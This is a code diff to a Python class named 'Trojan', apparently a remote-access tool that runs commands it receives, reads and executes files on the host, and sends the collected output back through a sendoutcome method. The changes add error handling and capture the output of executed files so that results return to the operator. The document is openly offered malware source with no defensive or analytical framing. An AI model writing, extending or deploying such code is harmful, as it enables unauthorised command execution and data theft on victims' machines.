@@ -56,7 +56,10 @@ class Trojan:
                 for cmd in values: #just keeps running seemingly random values
                     output = os.system('cmd /c "%s"'% cmd) 
                     if output == -1 or output == 1:
-                        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
+                        try:
+                            output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
+                        except Exception as e:
+                            output = e
                     outcomes['cmd'].append([ cmd, output])
             elif key.lower() == 'file-read':
                 for value in values:
@@ -80,16 +83,15 @@ class Trojan:
                     filetype = value.split('.')[-1]
                     if filetype == '.py': filetype = 'python'
                     #add other filetype checks here
-                    errors = ''
+                    output = ''
                     if '.' not in filetype: #been converted correctly
                         try:
-                            subprocess.Popen([filetype, value])
+                            output +=subprocess.check_output(shlex.split('%s %s' %(filetype, value)), stderr=subprocess.STDOUT).decode()
                         except Exception as e:
-                            errors += e
+                            output += str(e)
                     else:
-                        errors += '\n\n[*] Invalid file type\n\n'
-                    outcomes['file-run'].append([value, errors])
-        print('sent outcome')
+                        output += '\n\n[*] Invalid file type\n\n'
+                    outcomes['file-run'].append([value, output])
         self.sendoutcome(outcomes)
                     
                     
